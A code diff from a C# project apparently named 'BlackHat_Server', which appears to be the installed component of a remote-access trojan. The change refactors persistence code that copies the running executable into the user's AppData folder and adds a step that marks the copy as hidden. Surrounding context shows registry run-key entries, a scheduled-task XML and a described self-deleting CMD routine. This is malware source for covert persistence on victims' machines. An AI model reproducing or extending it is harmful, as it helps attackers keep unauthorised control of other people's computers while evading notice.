@@ -49,14 +49,7 @@ namespace BlackHat_Server.Class
                 var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                 var finalDestination = Path.Combine(appData, appDataPath);
             
-                // COPIO IL FILE IN APPDATA SE NON ESISTE
-                if (!File.Exists(finalDestination))
-                {
-                    if (!Directory.Exists(Directory.GetParent(finalDestination).FullName))
-                        Directory.CreateDirectory(Directory.GetParent(finalDestination).FullName);
-
-                    File.Copy(Application.ExecutablePath, finalDestination);
-                }
+                this.SaveFileIfNotExistsAndTryHidden(finalDestination);
 
                 var creationXml = xml.Replace("{{srvPath}}", finalDestination);
                 var fileName = $"{Guid.NewGuid():N}.xml";
@@ -92,22 +85,8 @@ namespace BlackHat_Server.Class
                 
                 rm.AddHKCUReg(regEntry, finalDestination);
 
+                this.SaveFileIfNotExistsAndTryHidden(finalDestination);
 
-                // COPIO IL FILE IN APPDATA SE NON ESISTE
-                if (!File.Exists(finalDestination))
-                {
-                    if (!Directory.Exists(Directory.GetParent(finalDestination).FullName))
-                        Directory.CreateDirectory(Directory.GetParent(finalDestination).FullName);
-
-                    File.Copy(Application.ExecutablePath, finalDestination);
-                }
-                
-                // TaskService.Instance.AddTask("Test4", new DailyTrigger()
-                //     {
-                //         Repetition = new RepetitionPattern(TimeSpan.FromMinutes(5),TimeSpan.Zero)
-                //     } ,
-                //     new ExecAction(finalDestination));
-                
             }
             catch (Exception ex)
             {
@@ -135,14 +114,7 @@ namespace BlackHat_Server.Class
                 rm.AddExplorerReg(regEntry, finalDestination);
 
 
-                // COPIO IL FILE IN APPDATA SE NON ESISTE
-                if (!File.Exists(finalDestination))
-                {
-                    if (!Directory.Exists(Directory.GetParent(finalDestination).FullName))
-                        Directory.CreateDirectory(Directory.GetParent(finalDestination).FullName);
-
-                    File.Copy(Application.ExecutablePath, finalDestination);
-                }
+               this.SaveFileIfNotExistsAndTryHidden(finalDestination);
             }
             catch
             {
@@ -176,6 +148,23 @@ namespace BlackHat_Server.Class
         //-------------------------------------------------
 
 
+        
+        private void SaveFileIfNotExistsAndTryHidden(string finalDestination)
+        {
+            if (File.Exists(finalDestination)) return;
+            
+            Directory.CreateDirectory(Path.GetDirectoryName(finalDestination));
+            File.Copy(Application.ExecutablePath, finalDestination);
+
+            try
+            {
+                File.SetAttributes(finalDestination,FileAttributes.Hidden);
+            }
+            catch 
+            {
+            }
+        }
+        
         /// <summary>
         ///     Crea Processo CMD per l'eliminazione del file in esecuzione dopo 10 SEC
         ///     DOPO CHIUDE L'APPLICAZIONE!!!!!!!!!
